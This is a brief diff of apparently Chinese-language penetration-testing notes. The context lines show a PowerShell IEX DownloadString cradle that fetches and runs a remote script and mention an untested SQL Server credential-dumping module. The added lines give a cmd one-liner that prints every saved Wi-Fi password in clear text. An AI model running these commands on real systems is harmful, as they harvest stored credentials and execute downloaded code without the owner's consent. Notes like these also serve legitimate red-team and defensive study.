@@ -47,6 +47,10 @@ powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.git
 
 sqlserver密码获取工具Get-MSSQLCredentialPasswords.psm1 //未测
 ```
+### 查看wifi密码
+```
+for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do  @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear
+```
 
 
 
